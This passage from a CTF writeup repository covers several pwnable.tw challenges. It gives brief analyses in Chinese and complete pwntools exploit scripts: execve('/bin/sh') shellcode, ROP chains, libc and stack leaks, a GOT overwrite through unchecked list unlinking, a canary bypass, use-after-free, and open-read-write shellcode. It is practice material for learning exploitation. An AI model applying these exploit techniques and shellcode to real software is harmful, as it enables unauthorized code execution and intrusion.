else:
    p = remote('chall.pwnable.tw', 10000)

p.recvuntil('CTF:')

payload = 'a' * 0x14        # pad
payload += p32(0x8048087)   # write - read - ret

p.send(payload)

addr = u32(p.recv(0x14)[:4])

payload = 'a' * 0x14        #pad
payload += p32(addr - 0x4 + 0x14 + 0x4)
payload += '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

p.sendline(payload)

p.interactive()
```




### File: writeups/pwnable.tw/pwn-applestore/readme.md

# poc

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

> 泄漏`libc`地址 -> 泄漏栈地址 -> 通过指针操作修改`got`表 -> 执行`system('&system_addr;/bin/sh\x00')`

mycart是一个链表，第一个块是空的。`handler`包括`list`、`add`、`delete`、`cart`、`checkout`等函数。如果`checkout`能够1元购机时即总额达到`7174`，会在链表末尾增加一个新块，但这个块地址在栈上，由于`checkout`和`cart`函数内部栈结构相同，因此在`cart`中从`buf[2]`开始的内容会覆盖这个块。块结构如下，因此可以利用`cart`通过修改`name_addr`造成任意地址泄露。

```
            ---------------
            |    last     |
            ---------------
            |    next     |
            ---------------
            |    price    |
            ---------------
            |  name_addr  |
buf[2]->    ---------------
```

由于`delete`内部处理和linux堆管理中`free`类似，就是链表删除节点操作，但没有进行检查，因此存在漏洞。如果`next = addr - 0x0c`，那么`*addr = *last`。同理如果`last = addr - 0x08`，那么`*addr = *next`。因为可以控制`atoi`传入参数，而`my_read`向`nptr`即`[ebp - 0x22]`读入值，因此考虑修改`ebp`成`got['atoi'] - 0x22`，这样能够直接修改`atoi`的`got`表中的值为`system`的地址，从而`get shell`。


> hint:
> 1. 由于存在指针操作，注意将next和last赋值准确，避免abort，gdb容易在出现错误前崩溃
> 2. 泄漏`libc`地址之后可以通过泄漏`environ`获得栈地址
> 3. 因为`libc`不可写，因此没有直接修改`got['atoi'] = &system`，因为另一个指针操作会修改system内容。


# exp

```python
from pwn import *

context(arch = 'i386', os = 'linux', log_level = 'debug')

DEBUG = 0

elf = ELF('applestore.dms')

if DEBUG:
    p = process('applestore.dms')
    gdb.attach(p)
    libc = ELF('libc-2.23.so')
else:
    p = remote('chall.pwnable.tw', 10104)
    libc = ELF('libc_32.so.6')

def additem(id):
    p.recvuntil('> ')
    p.send('2')
    p.recvuntil('Device Number> ')
    p.send(str(id))

def deleteitem(id):
    p.recvuntil('> ')
    p.send('3')
    p.recvuntil('Item Number> ')
    p.send(str(id))

def cart(content):
    p.recvuntil('> ')
    p.send('4')
    p.recvuntil('Let me check your cart. ok? (y/n) > ')
    p.send(content)

def checkout():
    p.recvuntil('> ')
    p.send('5')
    p.recvuntil('Let me check your cart. ok? (y/n) > ')
    p.send('y')

def leakaddr(addr, num):
    cart('yy' + p32(addr) + p32(1) + p32(0) * 2)
    p.recvuntil('%d: ' % num)
    return u32(p.recv(4))

def change(addr, nextptr, lastptr, num):
    deleteitem(str(num) + p32(addr) + p32(1) + p32(nextptr) + p32(lastptr))

l = [6, 20, 0, 0, 0]

for id, i in enumerate(l):
    for j in range(i):
        additem(id + 1)

s = sum(l) + 1

checkout()

libc_addr = leakaddr(elf.got['puts'], s) - libc.symbols['puts']
stack_addr = leakaddr(libc_addr + libc.symbols['environ'], s)
system_addr = libc_addr + libc.symbols['system']
atoi_addr = libc_addr + libc.symbols['atoi']
change(libc_addr, stack_addr - 0x104 -0xc, elf.got['atoi'] + 0x22, s)
p.send(p32(system_addr) + ';/bin/sh\x00')
p.interactive()
```



### File: writeups/pwnable.tw/pwn-calc/readme.md

# poc

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

> 任意读写 -> 栈溢出 -> ROP -> execve("/bin/sh", 0, 0)

根据程序逻辑分析得到，输入`+N`可以读栈上内存，输入`+N-M`可以向栈上写（注意`int`范围），恰好返回地址及其之后都可以写且不会被清空，构造ROP拿到shell即可。

# exp

```python
from pwn import *

DEBUG = 0

if DEBUG:
    context(log_level = 'debug')
    p = process('./calc.dms')
    gdb.attach(p, '''b *0x0804938D''')
else:
    p = remote('chall.pwnable.tw', 10100)

p.recvuntil('===\n')

addr = 361

pad = 0xdeadbeef

# int 80
g1 = 0x08049a21 # int 0x80

# ecx -> 0, eax -> 0
g2 = 0x08049f13 # xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret

# edx -> 0, ebx -> '/bin/sh\x00'
g3 = 0x080b6252 # pop ebx ; mov edx, ecx ; pop esi ; pop edi ; pop ebp ; ret

# eax -> 11
g4 = 0x0807cb7e # nop ; inc eax ; ret

# ebp addr
p.sendline('+360')
r = int(p.recvline())
ebp_addr = r - 0x20
log.info(ebp_addr)
def gen(code):
    global addr
    payload = '+%d' % addr
    p.sendline(payload)
    r = int(p.recvline())
    log.info('ori: ' + hex(code) +' diff: ' + hex(code - r))
    if code - r >= 0x80000000:
        payload = '+%d-%d' % (addr, r + 0x100000000 - code)
    elif code - r >= 0x0:
        payload = '+%d+%d' % (addr, code - r)
    elif r - code >= 0x80000000:
        payload = '+%d+%d' % (addr, code + 0x100000000 - r)
    else:
        payload = '+%d-%d' % (addr, r - code)
    p.sendline(payload)
    p.recvline() 
    addr += 1

gen(g2)     # ret
gen(pad)    # pop ebx
gen(pad)    # pop esi
gen(pad)    # pop edi
gen(pad)    # pop ebp

gen(g3)     # ret
gen(ebp_addr + (400-360) * 4)   # pop ebx
gen(pad)    # pop esi
gen(pad)    # pop edi
gen(pad)    # pop ebp

# eax -> 11
for i in range(11):
    gen(g4)

gen(g1)     # ret

for i in range(400 - addr):
    gen(pad)

gen(u32('/bin'))
gen(u32('/sh\x00'))

p.interactive()
```



### File: writeups/pwnable.tw/pwn-dubblesort/readme.md

# poc

```
Arch:     i386-32-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
FORTIFY:  Enabled
```

> 泄漏`libc`地址 -> 绕过`canary` -> 栈溢出 -> `system('/bin/sh\x00')`

本地调试发现栈上残留`libc`地址，输入特定长度名字可以泄漏，根据相对偏移算出`libc`基址，当输入较大数字个数时可触发栈溢出，但`canary`需要特殊技巧绕过，`__isoc99_scanf("%u", &a)`可以通过输入`"+"`避免读入修改`canary`，剩余问题只需考虑计算栈地址，及排序后不影响`system`调用即可。

# exp

```python
from pwn import *

DEBUG = 0

context(arch = 'i386', os = 'linux', log_level = 'debug')

if DEBUG:
    p = process('./dubblesort.dms')
    e = ELF('./libc-2.23.so')
    gdb.attach(p)
else:
    p = remote('chall.pwnable.tw', 10101)
    e = ELF('./libc_32.so.6')

p.sendline('a' * 20 + 'abcd')
p.recvuntil('abcd')
libc_base = (u32(p.recv(4)) & 0xffffff00) - 0x1b0000
log.debug('%s => %d' % ('libc_base', libc_base))

system_addr = libc_base + e.symbols['system']
binsh_addr = libc_base + list(e.search('/bin/sh\x00'))[0]

p.sendline(str(35))

for i in range(24):
    p.sendline(str(i))

p.sendline('+')

for i in range(8):
    p.sendline(str(system_addr))

for i in range(2):
    p.sendline(str(binsh_addr))

p.interactive()
```



### File: writeups/pwnable.tw/pwn-hacknote/readme.md

# poc

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

> uaf -> 泄漏libc -> 执行system("&system;sh\x00")

`free`只释放内存，没置空指针，因此考虑申请node0及node1，note长度要大于12，然后释放node0，node1，再申请node2，最长可以控制node0的12B内存。而node0前4B是调用`puts`，参数是后4B，因此考虑泄漏`libc`中某个函数的地址，从而得到`system`地址。释放node2，申请node3仍可修改node0内容，其中前4B替换为`system`，但参数变为`system`地址开始的字符串，`system`参数需要用`;`进行间隔才能正确拿shell，因此后面内容设置为`;sh\x00`即可。（注意`'\n'`也是一个字符，会影响长度)

# exp

```python
from pwn import *

context(arch = 'i386', os = 'linux', log_level = 'debug')

DEBUG = 0

f = ELF('hacknote.dms')

if DEBUG:
    p = process('hacknote.dms')
    gdb.attach(p)
    e = ELF('libc-2.23.so')
else:
    p = remote('chall.pwnable.tw', 10102)
    e = ELF('libc_32.so.6')

def add(size, content):
    p.recvuntil(':')
    p.sendline('1')
    p.recvuntil(':')
    p.sendline(str(size))
    p.recvuntil(':')
    p.sendline(str(content))

def free(index):
    p.recvuntil(':')
    p.sendline('2')
    p.recvuntil(':')
    p.sendline(str(index))

def prt(index):
    p.recvuntil(':')
    p.sendline('3')
    p.recvuntil(':')
    p.sendline(str(index))

add(100, 1)
add(100, 1)
free(0)
free(1)

puts = 0x0804862B
puts_got = f.got['puts']

add(9, p32(puts) + p32(puts_got))
prt(0)

puts_addr = u32(p.recv(4))
libc_base = puts_addr - e.symbols['puts']
system_addr = libc_base + e.symbols['system']

free(2)
add(9, p32(system_addr) + ';sh\x00')
prt(0)

p.interactive()
```



### File: writeups/pwnable.tw/pwn-orw/readme.md

# poc

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segments
```

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

> open("/home/orw/flag") -> read() -> write()

看到prctl，利用seccomp-tools查过滤，发现可以对文件进行操作，直接写shellcode读flag。

# exp

```python
from pwn import *

DEBUG = 0

if DEBUG:
    context(log_level = 'debug')
    p = process('./orw.dms')
    gdb.attach(p)
else:
    p = remote('chall.pwnable.tw', 10001)

addr = 0x0804A060       # bss addr
path = 0x0804A0A0       # file path addr
size = 0x30             # flag length
payload = ''
payload += asm('xor eax, eax; mov al, 5; mov ebx, %d; xor ecx, ecx; xor edx, edx; int 0x80;' % path)
payload += asm('mov ebx, eax; xor eax, eax; mov al, 3; mov ecx, %d; xor edx, edx; mov dl, %d; int 0x80;' % (path, size))
payload += asm('xor eax, eax; mov al, 4; xor ebx, ebx; mov bl, 1; mov ecx, %d; xor edx, edx; mov dl, %d; int 0x80;' % (path, size))
payload += 'a' * (path - addr - len(payload)) + '/home/orw/flag\x00'

print payload.encode('hex')

p.recvuntil('shellcode:')

p.sendline(payload)

p.interactive()
```



### File: writeups/pwnable.tw/readme.md

# contest

[https://pwnable.tw](https://pwnable.tw)


### File: writeups/readme.md

# writeups

This is a writeup and sum ups repository of team D.I.E from tju.

